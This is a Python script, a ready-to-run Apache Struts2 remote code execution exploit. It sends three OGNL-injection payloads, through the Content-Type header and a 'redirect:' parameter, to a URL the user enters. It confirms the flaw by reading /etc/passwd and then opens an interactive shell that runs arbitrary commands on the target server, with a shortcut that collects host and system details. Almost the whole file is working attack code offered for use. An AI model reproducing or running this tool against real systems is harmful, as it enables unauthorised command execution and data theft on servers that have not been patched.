import requests 
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import os
import time
from rich import print

logo = r"""
    (`/\
    `=\/\ ApacheStruts
     `=\/\  Exploit
      `=\/ 
        \
"""


session = requests.session()

def payload_struts_three(cmd):
    payload = "%{"
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    if cmd == "quit":
    	quit()
    if cmd == "sysconfig":
    	cmd = "cat /proc/cpuinfo|head;free -g;cat /etc/hosts;cat /etc/*-release|head"
    payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
    payload += "}"
    headers = {'Content-Type': payload}

    r = session.get(url, headers=headers, verify=False)
    return f"\n{r.text}"




def payload_struts_two(cmd):
    one = url + \
        "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','"
    end = "'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
    
    if cmd == "quit":
    	exit()

    if cmd == "sysconfig":
    	print("\n[yellow]Getting cpu, server, host & memory info ...  [/]")
    	cmd = "cat /proc/cpuinfo|head;free -g;cat /etc/hosts;cat /etc/*-release|head"

    r = session.get(one+cmd+end, verify=False)
    return f"\n{r.text}"

def payload_struts(cmd):
	if cmd == "sysconfig":
		print("\n[yellow]Getting cpu, server, host & memory info ...  [/]")
		cmd = "cat /proc/cpuinfo|head;free -g;cat /etc/hosts;cat /etc/*-release|head"

	if cmd == "quit":
		print("\nClosing shell...")
		exit()

	headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "close",
               "User-Agent": "Mozilla Firefox"}
	content_type = ("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                    "(#_memberAccess?(#_memberAccess=#dm):"
                    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                    "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
                    "(#context.setMemberAccess(#dm))))."
                    "(#gift='%s')."
                    "(#isnix=(@java.lang.System@getProperty('file.separator').equals(\"/\")))."
                    "(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift}))."
                    "(#p=new java.lang.ProcessBuilder(#giftarray))."
                    "(#p.redirectErrorStream(true)).(#process=#p. start())."
                    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                    "(#ros.flush())}" %cmd)
	headers['Content-Type'] = content_type
	try:
		r = session.get(url, headers=headers, verify=False)
		return f"\n{r.text}"
	except requests.exceptions.ConnectionError:
		return 503

def run_payload_three():
	print("[cyan]:: Payload 3 running... [/]", end='')
	verify_vul = payload_struts_three('cat /etc/passwd')
	if "0:root" in verify_vul:
		print("[red][VULNERABLE][/] ", end='')
		question_yorn = input("Exploit? [y/N] ")
		if question_yorn == "y":
			os.system("clear")
			print(logo)
			print(f"[yellow]:: Some commands you must use:[/]\n[cyan] ~ sysconfig[/]\n")
			while True:
				cmd = input("~$ ")
				print(payload_struts_three(cmd))

	else:
		print("\r[green][OK][/]")
		return	

def run_payload_two():
	print("[cyan]:: Payload 2 running... [/]", end='')
	verify_vul = payload_struts_two('cat /etc/passwd')
	if "0:root" in verify_vul:
		print("[red][VULNERABLE][/] ", end='')
		question_yorn = input("Exploit? [y/N] ")
		if question_yorn == "y":
			os.system("clear")
			print(logo)
			print(f"[yellow]:: Some commands you must use:[/]\n[cyan] ~ sysconfig[/]\n")
			while True:
				cmd = input("~$ ")
				print(payload_struts_two(cmd))
	else:
		print("\r[green][OK][/]")
		return	

def run_payload_one():
	print("[cyan]:: Payload 1 running... [/]", end='')
	verify_vul = payload_struts('cat /etc/passwd')
	if (verify_vul == 500):
		print("[red] [ERR] Connection error on webserver[/]\n")
		exit()

	if "0:root" in verify_vul:
		print("[red][VULNERABLE][/] ", end='')
		question_yorn = input("Exploit? [y/N] ")
		if question_yorn == "y":
			os.system("clear")
			print(logo)
			print(f"[yellow]:: Some commands you must use:[/]\n[cyan] ~ sysconfig\n")
			while True:
				cmd = input("~$ ")
				print(payload_struts(cmd))
	else:
		print("\r[green][OK][/]")
		return

print(logo)
url = input(":: Target ~> ")
print("\n[yellow]:: Scanning for Struts2 ...[/]\n")
run_payload_one()
run_payload_two()
run_payload_three()
